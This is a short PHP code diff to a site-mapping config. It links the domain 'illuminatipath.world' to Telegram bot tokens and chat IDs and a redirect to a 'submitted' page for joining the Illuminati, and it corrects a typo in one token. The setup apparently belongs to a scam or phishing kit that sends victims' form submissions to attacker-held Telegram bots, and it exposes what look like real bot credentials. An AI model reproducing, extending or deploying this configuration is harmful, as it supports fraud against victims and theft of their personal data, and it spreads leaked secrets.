@@ -24,7 +24,7 @@ $site_map = [
     'illuminatipath.world' => [
         "bots" => [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
-            ['token' => '7942412343:AAEVirV9J2LHm0pqfmtkMYEUrEqABqVXE4', 'chat_id' => '6772487570'],
+            ['token' => '7942412343:AAEVirV9J2LHm0-pqfmtkMYEUrEqABqVXE4', 'chat_id' => '6772487570'],
         ],
         "redirect" => "https://illuminatipath.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
     ],
